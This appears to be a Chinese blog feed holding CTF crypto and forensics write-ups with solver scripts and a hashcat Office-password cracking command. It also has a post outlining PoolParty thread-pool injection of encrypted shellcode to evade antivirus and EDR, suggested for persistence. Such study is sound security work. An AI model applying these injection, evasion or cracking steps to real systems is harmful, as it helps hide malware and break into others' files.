b&#x27;tf&#123;es72b!a5-njad!@-#!@$sad-6bysgwy-1adsw8&#125;\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;es72b!a5-njad!@-#!@$sad-6bysgwy-1adsw8&#125;\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="5-moectf-ez-chain"><a href="#5-moectf-ez-chain" class="headerlink" title="5.moectf ez_chain"></a>5.moectf ez_chain</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    key = <span class="built_in">int</span>(fs.read().strip())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">72</span></span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"> </span><br><span class="line">base = bytes_to_long(<span class="string">b&quot;koito&quot;</span>)</span><br><span class="line">iv = <span class="number">3735927943</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockize</span>(<span class="params">long</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> long &gt; <span class="number">0</span>:</span><br><span class="line">        out.append(long % base)</span><br><span class="line">        long //= base</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">reversed</span>(out))</span><br><span class="line"> </span><br><span class="line">blocks = blockize(m)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    encrypted = [iv]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        encrypted.append(blocks[i] ^ encrypted[i] ^ key)</span><br><span class="line">    <span class="keyword">return</span> encrypted[<span class="number">1</span>:]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(encrypt_block_cbc(blocks, iv, key))</span><br><span class="line"><span class="comment"># [8490961288, 122685644196, 349851982069, 319462619019, 74697733110, 43107579733, 465430019828, 178715374673, 425695308534, 164022852989, 435966065649, 222907886694, 420391941825, 173833246025, 329708930734]</span></span><br></pre></td></tr></table></figure>

<p>题目分析：</p>
<p>1.flag 72位，m为flag 需求项</p>
<p>2.需要写2个解密函数 decrypt_block_cbc 和 deblockize</p>
<p>K = 密文块 ^ 明文块 ^ iv</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">base = bytes_to_long(<span class="string">b&quot;koito&quot;</span>)</span><br><span class="line">iv = <span class="number">3735927943</span></span><br><span class="line"> </span><br><span class="line">blocks = [<span class="number">8490961288</span>, <span class="number">122685644196</span>, <span class="number">349851982069</span>, <span class="number">319462619019</span>, <span class="number">74697733110</span>, <span class="number">43107579733</span>, <span class="number">465430019828</span>, <span class="number">178715374673</span>, <span class="number">425695308534</span>, <span class="number">164022852989</span>, <span class="number">435966065649</span>, <span class="number">222907886694</span>, <span class="number">420391941825</span>, <span class="number">173833246025</span>, <span class="number">329708930734</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockize</span>(<span class="params">long</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> long &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 取余数 存入 out</span></span><br><span class="line">        out.append(long % base)</span><br><span class="line">        long //= base</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">reversed</span>(out))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deblockize</span>(<span class="params">blocks</span>):</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        out = out * base + block</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    encrypted = [iv]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        encrypted.append(blocks[i] ^ encrypted[i] ^ key)</span><br><span class="line">    <span class="keyword">return</span> encrypted[<span class="number">1</span>:]</span><br><span class="line"><span class="comment"># blocks[0] ^ iv ^ key =  flag[0]</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    <span class="comment"># iv 初始化向量</span></span><br><span class="line">    encrypted = [iv, *blocks]</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        decrypted.append(encrypted[i] ^ encrypted[i + <span class="number">1</span>] ^ key)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"> </span><br><span class="line"><span class="comment">#  flag = moectf&#123;xxx&#125;</span></span><br><span class="line"><span class="comment">#  72个字符  其中 moectf 6 &#123;&#125; 2  72-2-6=64个</span></span><br><span class="line"><span class="comment">#  flag[0] = blocks[0] ^ key ^ iv</span></span><br><span class="line"><span class="comment">#  key = iv ^ blocks[0] ^ flag[0]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,blockize(bytes_to_long(<span class="string">b&quot;moectf&#123;&quot;</span> + <span class="string">b&quot;0&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;&#125;&quot;</span>))[<span class="number">0</span>] )</span><br><span class="line"><span class="comment"># print(blockize(bytes_to_long(b&quot;moectf&#123;&quot; + b&quot;0&quot;*64 + b&quot;&#125;&quot;)))</span></span><br><span class="line">key = blockize(bytes_to_long(<span class="string">b&quot;moectf&#123;&quot;</span> + <span class="string">b&quot;0&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;&#125;&quot;</span>))[<span class="number">0</span>] ^ iv ^ blocks[<span class="number">0</span>]</span><br><span class="line">m = long_to_bytes(deblockize(decrypt_block_cbc(blocks, iv, key)))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key:&quot;</span>,key)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>



<h4 id="6-Afctf-MyOwnCBC"><a href="#6-Afctf-MyOwnCBC" class="headerlink" title="6.Afctf MyOwnCBC"></a>6.Afctf MyOwnCBC</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyOwnCBC</span>(<span class="params">key, plain</span>):</span><br><span class="line">  <span class="comment"># key 32位  但key未知</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(key)!=<span class="number">32</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line">	cipher_txt = <span class="string">b&quot;&quot;</span></span><br><span class="line">	cipher_arr = []</span><br><span class="line">	<span class="comment"># 自定义加密 ECB </span></span><br><span class="line">	cipher = AES.new(key, AES.MODE_ECB, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="comment"># 等价于 cipher = AES.new(key, AES.MODE_ECB)</span></span><br><span class="line">	plain = [plain[i:i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plain), <span class="number">32</span>)]</span><br><span class="line">  	<span class="comment"># 32位(16字节)为一组 然后进行ECB加密</span></span><br><span class="line">	<span class="built_in">print</span> plain</span><br><span class="line">  	<span class="comment"># 加密后 存入密文数组 	</span></span><br><span class="line">	cipher_arr.append(cipher.encrypt(plain[<span class="number">0</span>]))</span><br><span class="line">	cipher_txt += cipher_arr[<span class="number">0</span>]</span><br><span class="line">	</span><br><span class="line">  	<span class="comment"># cipher_txt = [cipher_arr[i]] 	</span></span><br><span class="line">  	<span class="comment"># 上一个密文 作为 下一个密文的密钥key进行加密</span></span><br><span class="line">  	<span class="comment"># key0 为第一组的密文 即 key0 = cipher[0:32]</span></span><br><span class="line">	<span class="comment"># 然后以 前一个 cipher_arr[i-1]作为key 进行ecb加密</span></span><br><span class="line">	<span class="comment">#   cipher_arr[i-1] ^ cipher_arr[i]</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(plain)):</span><br><span class="line">		cipher = AES.new(cipher_arr[i-<span class="number">1</span>], AES.MODE_ECB, <span class="string">&quot;&quot;</span>)</span><br><span class="line">		cipher_arr.append(cipher.encrypt(plain[i]))</span><br><span class="line">		cipher_txt += cipher_arr[i]</span><br><span class="line">	<span class="keyword">return</span> cipher_txt</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 生成256位的随机整数	</span></span><br><span class="line">key = random.getrandbits(<span class="number">256</span>)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	s = f.read()</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文写入到flag_cipher 是已知项</span></span><br><span class="line"><span class="comment"># 长度为 6A0h = 1696</span></span><br><span class="line"><span class="comment"># 1696 / 32 = 53组</span></span><br><span class="line"><span class="comment"># 由于上一个密文作为key 参与下一次密文加密 所以长度都相同</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag_cipher&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(MyOwnCBC(key, s))</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>

<p>plain = [plain[i:i+32] for i in range(0, len(plain), 32)] # 32位一组</p>
<p>第一次密文 作为密钥key0参与ECB加密  key = cipher[:32]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag_cipher&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="comment"># print(len(fp.read()))</span></span><br><span class="line">    cipher = fp.read()</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line">key0 = cipher[:<span class="number">32</span>]</span><br><span class="line"><span class="built_in">print</span>(key0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyOwnCBC</span>(<span class="params">key0,cipher</span>):</span><br><span class="line">    cipher = [cipher[i:i + <span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">32</span>)]</span><br><span class="line">    m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    tmpkey = key0</span><br><span class="line">	<span class="comment"># 上一次的密文作为key参与下一次ECB</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(cipher)):</span><br><span class="line">        aes = AES.new(tmpkey,AES.MODE_ECB)</span><br><span class="line">        m += aes.decrypt(cipher[i])</span><br><span class="line">        tmpkey = cipher[i]</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(MyOwnCBC(key0,cipher))</span><br><span class="line"><span class="comment">#b&#x27;\xe5\xdf\x94sJ\xc2\xcd\x04\xeb\xb7\xcf\x05(\xbe\x98\\\xe9\xc3^\x1f!\xfb\xea6\xdac\x1f\xfe\x901\xbb\x13&#x27;</span></span><br><span class="line"><span class="comment">#b&quot;mode of operation is an algorithm that uses a block cipher to provide an information service such as confidentiality or authenticity. A block cipher by itself is only suitable for the secure cryptographic transformation (encryption or decryption) of one fixed-length group of bits called a block. A mode of operation describes how to repeatedly apply a cipher&#x27;s single-block operation to securely transform amounts of data larger than a block.\n\nMost modes require a unique binary sequence, often called an initialization vector (IV), for each encryption operation. The IV has to be non-repeating and, for some modes, random as well. The initialization vector is used to ensure distinct ciphertexts are produced even when the same plaintext is encrypted multiple times independently with the same key. Block ciphers have one or more block size(s), but during transformation the block size is always fixed. Block cipher modes operate on whole blocks and require that the last part of the data be padded to a full block if it is smaller than the current block size. There are, however, modes that do not require padding because they effectively use a block cipher as a stream cipher.\n\nHistorically, encryption modes have been studied extensively in regard to their error propagation properties under various scenarios of data modification. Later development regarded integrity protection as an entirely separate cryptographic goal. Some modern modes of operation combine confidentiality and authenticity in an efficient way, and are known as authenticated encryption modes.\n\nAh you found it~ afctf&#123;Don&#x27;t_be_fooled_by_yourself&#125;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;</span></span><br></pre></td></tr></table></figure>





<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://bbs.kanxue.com/thread-253884.htm">https://bbs.kanxue.com/thread-253884.htm</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>PoolParty_Windows线程池注入</title>
    <url>/posts/df681750/</url>
    <content><![CDATA[<p>参考文章</p>
<p><a href="https://mp.weixin.qq.com/s/GEZZ5XPmbJ39c5i9GmvxRA">https://mp.weixin.qq.com/s/GEZZ5XPmbJ39c5i9GmvxRA</a></p>
<p><a href="https://xz.aliyun.com/t/13184">https://xz.aliyun.com/t/13184</a> 这篇文章也不错 对原文的翻译</p>
<p><a href="https://github.com/SafeBreach-Labs/PoolParty">https://github.com/SafeBreach-Labs/PoolParty</a></p>
<p>因为之前没去详细接触过Windows核心编程 线程池这些的 所以再看文章的时候有点地方不太好懂。。</p>
<p>看了下原项目作者的代码也很难懂 <a href="https://github.com/0xEr3bus/PoolPartyBof">https://github.com/0xEr3bus/PoolPartyBof</a> 这个bof的项目则相对好理解些</p>
<p>可以用权限维持时使用该bof注入进程</p>
<p>现在感觉有时候bof确实要好用些 不过自己写起来调试太麻烦 ：|</p>
<p><a href="https://mp.weixin.qq.com/s/GEZZ5XPmbJ39c5i9GmvxRA">https://mp.weixin.qq.com/s/GEZZ5XPmbJ39c5i9GmvxRA</a> 这篇也解释了实现方法，并将bof项目的代码稍加修改成c，</p>
<p>通过python对shellcode 利用aes 32位随机key进行加密后转base64生成sc.h文件</p>
<p>![image-20240204135246901](/Users/mamor/Library/Application Support/typora-user-images/image-20240204135246901.png)</p>
<p>放到loaderz中解密即可 然后 利用poolparty进行进程注入【当然在注入时 杀软可能会对Explorer.exe等严格把控，需根据情况选择注入进程】</p>
<p>常见的代码注入 主要分三步： 分配/修改空间、写入shellcode、执行进程/线程</p>
<p>正常情况下 申请内容空间或写入shellcode并不会被管控，杀软会在执行进程/线程时进行严格监控。</p>
<p>poolparty 主要利用用户态下 Windows的可信线程池机制 解决了执行时的问题，以规避杀软EDR的检测。</p>
<p>![image-20240204135230477](/Users/mamor/Library/Application Support/typora-user-images/image-20240204135230477.png)</p>
<p>看了下bof中的代码思路：</p>
<p>1.获取进程PID</p>
<p>2.劫持句柄</p>
<p>3.申请shellcode的内存空间</p>
<p>4.写入shellcode</p>
<p>5.执行【主要在这步中有所区别】 这里没具体了解过详细的Windows线程池，所以有些代码看上去有些困难[需要再花费精力去找相关文档</p>
<p>在bof中给出了5种额外的方式</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_4.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_4.c</a> TP_IO</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_5.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_5.c</a> TP_ALPC</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_6.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_6.c</a> TP_JOB</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_7.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_7.c</a> TP_DIRECT</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_8.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_8.c</a> TP_TIMER</p>
]]></content>
  </entry>
  <entry>
    <title>某电子取证WP</title>
    <url>/posts/657ea34/</url>
    <content><![CDATA[<p><strong>题目2-1</strong>（本题3分）</p>
<p>提取检材压缩包的SHA256值，以此作为flag提交。</p>
<p>Certutil -hashfile 检材2.rar sha256</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063429362-1a67e38b-0e1e-4828-a659-56876aeecaa3.png" alt="img"></p>
<p><strong>题目2-2</strong>（本题7分）</p>
<p>破解该检材系统的用户名及密码（均为8位以内英文加数字的弱口令），并以密码作为flag提交。</p>
<p>FTK挂载VMDK </p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063439315-07401b81-cc1e-4cba-892f-1eec9270cb89.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063449489-a66c8029-1fac-4691-8b0a-1d9190603c09.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063456770-ca6478e3-73f7-4e02-89f6-47c311c2880c.png" alt="img"></p>
<p>md5解密 得到 admin888</p>
<p><strong>题目2-3</strong>（本题2分）</p>
<p>提取该检材系统的版本号，以此作为flag提交。（示例：11.11）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063470195-42b2c668-e645-4a72-833f-2d281c594d1a.png" alt="img"></p>
<p>也可通过FTK翻文件找到 os-relaease </p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063514798-957a81f6-45e0-4df5-a857-2b2ff8b472a0.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063522642-77dc82e6-fa38-474f-9492-bfe25a1b3652.png" alt="img"></p>
<p>16.04</p>
<p><strong>题目2-4</strong>（本题3分）</p>
<p>提取该检材的网站文件目录，以此作为flag提交。</p>
<p>/home/admin888/fund</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063537576-690bc4a2-cda6-4097-b46e-7eede13e6b1a.png" alt="img"></p>
<p><strong>题目2-5</strong>（本题3分）</p>
<p>提取网站对应的数据库文件名，以此作为flag提交。</p>
<p>上一问中发现存在 db.sqlite3 数据库文件  所以 flag{db.sqlite3}</p>
<p><strong>题目3-1</strong>（本题3分）</p>
<p>1.恢复该检材数据，找出被删除的log文件，并以此作为flag提交。（不含后缀名）（3分）</p>
<p>ftk直接挂载 发现log文件</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063561645-0ce8fe9f-c8a7-4f55-badc-67af3bb1988e.png" alt="img"></p>
<p><strong>题目3-2</strong>（本题7分）</p>
<p>分析日志文件，分析数据库sys_user表的插入操作次数，并以此作为flag提交。</p>
<p>查看文件中INSERT INTO <code>sys_user</code> VALUES 出现的次数：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063585322-eb9df81a-e672-45f3-a2a6-c76f45705a4f.png" alt="img"></p>
<p>flag{344}</p>
<p><strong>题目3-3</strong>（本题3分）</p>
<p>分析操作日志，发现有学生的手机号被修改，以此学生姓名作为flag提交。</p>
<p>看到还有个mysql-bin.000001文件 ，导出进行查看</p>
<p>题目中说的是更新操作，第一个想到的是UPDATE操作，全局搜索UPDATE，发现只有两次出现：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063620464-b00ceccb-369f-41b0-8bc6-efbd2baf872b.png" alt="img"></p>
<p>后一个为更新student手机号操作：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063635900-36d0c04d-7c1f-4de3-9e95-2c8c083edd9b.png" alt="img"></p>
<p>更新的student 表中的字段 id为1 ， 尝试定位Student表【直接全局搜索student】：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063652321-10d9e32f-4646-4b94-9865-def60ecbe795.png" alt="img"></p>
<p>flag{张三}</p>
<p><strong>题目4-1</strong>（本题3分）</p>
<p>恢复该检材数据，找出被删除的文件，并以此文件名作为flag提交。（不含后缀名）</p>
<p>通过R-STUDIO打开镜像 翻磁盘找到 记账2022.6.xls</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063707331-ea450272-1b10-4bf8-bd59-0594ce0eeaa0.png" alt="img"></p>
<p>FTK加载也可以直接找到</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063734888-a5c6f87d-b93d-4360-9828-417b5f763a23.png" alt="img"></p>
<p>flag{记账2022.6}</p>
<p><strong>题目4-2</strong>（本题7分）</p>
<p>分析被删除的文件，破解文件密码（密码为以qw开头的10位小写英文加数字），并以此作为flag提交。</p>
<p>shab题目 让爆破密码</p>
<p>office2john【<a href="https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/office2john.py%E3%80%91%E6%8F%90%E5%8F%96hash+hashcat%E7%88%86%E7%A0%B4">https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/office2john.py】提取hash+hashcat爆破</a></p>
<p>使用office2john将office转换为hash</p>
<p>python2 office2john.py 记账2022.6.xlsx &gt; 6.txt</p>
<p>awk -F “:” ‘{print $2}’ 6.txt &gt; hash6.txt 分割转换成hash形式</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063771341-4e0e033b-f2c5-4eea-ad94-e63cbbd3afd6.png" alt="img"></p>
<p>使用hashcat进行破解</p>
<p>hashcat -a 3 -m 9400 –force ‘$office$<em>2007</em>20<em>128</em>16<em>f02ba736547ad5a1c36bed8d8a56b752</em>8753f6105ce9822aa806adff2c36e6e4*209409be3a4215f4fd42ab6d5ff28496e2973783’ ‘qw?h?h?h?h?h?h?h?h’ -o 6result.txt </p>
<p>直接跑默认的构造字典时间比较久 最好是通过构造的密码本去爆破</p>
<p>得到密码为 flag{qwer123456} </p>
<p><strong>题目4-3</strong>（本题7分）</p>
<p>恢复该文件，以该文件的创建时间作为flag提交。</p>
<p>（格式：2023-12-1902:11:11，去除空格）</p>
<p>2022-07-1409:15:07 这个是错的 推测是时区和取证磁盘时区不对</p>
<p>但是答案有问题 （仔细看 创建时间在修改时间之后 感觉被篡改了 需要进行还原 但是问了下别人说这没啥问题）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063808314-c0196a33-6da5-49b6-864d-3918d351fcc1.png" alt="img"></p>
<p>时区有问题 需要 -8 才能到镜像文件的时区</p>
<p>flag{2022-07-1401:15:07}</p>
<p><strong>题目5-1</strong>(检材2.rar-2)（本题5分）</p>
<p>分析检材网站的管理后台，并以此URL作为flag提交。（格式：<a href="http://ip:port/xxx,全小写）">http://ip:port/xxx,全小写）</a></p>
<p><a href="http://192.168.181.187:8000/admin/">http://192.168.181.187:8000/admin/</a></p>
<p>在题目2中 /home/admin888 目录下存在script.sh文件中泄露了Django开发端口 所以可以直接去访问8000端口 或者扫下端口也找得到8000端口</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063833700-95291d41-ddc5-4bc1-8814-7501abc4712c.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063866700-bc9d927c-9c6b-443f-8ed4-3c4136e6b5d5.png" alt="img"></p>
<p><strong>题目5-2</strong>（本题2分）</p>
<p>分析网站后台的超级管理员账号，以此作为flag提交。</p>
<p>admin888</p>
<p><strong>题目5-3</strong>（本题5分）</p>
<p>分析网站密码的加密方式，并以此算法名称作为flag提交。</p>
<p>进入user </p>
<p>【pbkdf2_sha256】这个答案有问题</p>
<p><strong>题目5-4</strong>（本题3分）</p>
<p>分析该网站记录的银行卡信息数量，并以此作为flag提交。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063882575-77a89ac8-35da-4680-8534-b7a4a9308d0c.png" alt="img"></p>
<p>45</p>
<p><strong>题目5-5</strong>（本题5分）</p>
<p>分析家庭住址在苏州的用户，并其手机号作为flag提交。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063894250-6f2c03df-70d2-4bae-a662-78b2d1a05f66.png" alt="img"></p>
<p>15066223399</p>
<p><strong>题目6-1</strong>(检材5)（本题3分）</p>
<p>分析该apk获得的权限，并以此作为flag提交。（示例：存储空间）</p>
<p>flag{位置信息、存储空间、电话、通讯录}</p>
<p>模拟器安装apk 查看应用权限</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063916172-d78cc47e-cca7-4384-86de-1a18ad83b3c0.png" alt="img"></p>
<p><strong>题目6-2</strong>（本题7分）</p>
<p>分析该apk的首页回传地址，并以此作为flag提交。（示例：<a href="http://www.test.com:12345）">www.test.com:12345）</a></p>
<p><a href="http://www.xz-2021.com:8081/">www.xz-2021.com:8081</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063925071-3b171778-c496-45b9-8707-fd6678470c2c.png" alt="img"></p>
<p><strong>题目6-3</strong>（本题3分）</p>
<p>分析该apk的签名类型，并以此作为flag提交。（全小写）</p>
<p>Signature type: SHA256withRSA</p>
<p>flag{SHA256withRSA}</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063934804-731277c5-5c96-48ed-9715-f087dc58c4ff.png" alt="img"></p>
<p><strong>题目6-4</strong>（本题7分）</p>
<p>分析apk的入口函数，并以此作为flag提交。（示例：com.aa.bb.cc.dd）</p>
<p>android.intent.category.LAUNCHER</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063943231-8cac913b-b6fa-4c9c-8431-3c65bc03e73a.png" alt="img"></p>
]]></content>
      <categories>
        <category>取证</category>
      </categories>
      <tags>
        <tag>取证</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF_WriteUp</title>
    <url>/posts/undefined/</url>
    <content><![CDATA[<p>前段时间刷了下西电moectf，作为老签到型混子选手来学习下</p>
<p>主要做了下 misc和crypto   之前没搞过现代密码学相关的，然后主要学了下rsa相关算法 原理，只能说太需要依靠数学基础了，好多公式根本推到不出来 太菜了QAQ，一个公式推半天（摸鱼好方法）</p>
<h3 id="Classical-Crypto"><a href="#Classical-Crypto" class="headerlink" title="Classical-Crypto"></a>Classical-Crypto</h3><h4 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h4><p>&gt;@64E7LC@Ecf0:D0;FDE020D:&gt;!=60=6EE6C0DF3DE:EFE:@?04:!96C0tsAJdEA6d;F}%0N</p>
<p>考察的rot密码 常见rot加密包括 rot5 rot13 rot18 rot47</p>
<p>Rot47 对数字 字母 符号会进行编码 </p>
<p><img src="/posts/undefined/1.png" alt="img"></p>
<p>moectf{rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_}</p>
<h4 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h4><p>mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp}e{ciri_hT_avn3Fa_j<br>栅栏密码 栏数为3</p>
<p>moectf{F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj}</p>
<h4 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h4><p>听题目应该是凯撒密码或者变种</p>
<p>tvljam{JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av}</p>
<p><a href="http://www.hiencode.com/caesar.html">http://www.hiencode.com/caesar.html</a>  在线解密  t -&gt; m 应该是7个<br>moectf{caesae_cipher_is_a_very_simpie_cipher!_sfnont40j5duxjstd5xatz4to}</p>
<p>但是flag好像不对？！！ 这个解密的大小写全变为小写了 换另一个解密的  得到flag </p>
<p>moectf{CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To}</p>
